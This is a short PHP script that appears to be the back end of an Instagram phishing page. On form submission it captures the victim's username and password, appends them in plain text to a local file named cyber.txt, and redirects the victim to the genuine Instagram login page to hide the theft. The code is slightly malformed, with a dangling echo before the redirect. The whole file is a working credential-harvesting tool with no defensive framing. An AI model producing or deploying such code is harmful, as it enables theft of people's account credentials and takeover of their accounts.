<?php

 if(isset($_POST['submit_btn']))
 {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $text = $username . "," . $password . "\n";
  $fp = fopen('cyber.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo
//  browser

header("Location: https://www.instagram.com/accounts/login/");
 
}
}
exit


?>
